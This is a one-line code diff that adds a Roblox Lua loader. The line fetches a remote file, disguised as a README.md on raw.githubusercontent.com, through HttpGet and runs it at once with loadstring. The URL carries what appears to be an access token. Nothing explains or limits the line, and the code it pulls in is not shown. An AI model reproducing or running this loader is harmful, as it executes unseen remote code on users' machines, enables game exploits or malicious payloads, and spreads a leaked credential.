@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HELLUGUYSS/hellu/refs/heads/main/README.md?token=GHSAT0AAAAAADCFYPS7B23MFNCX2I3XLNQ2Z74STPQ", true))()
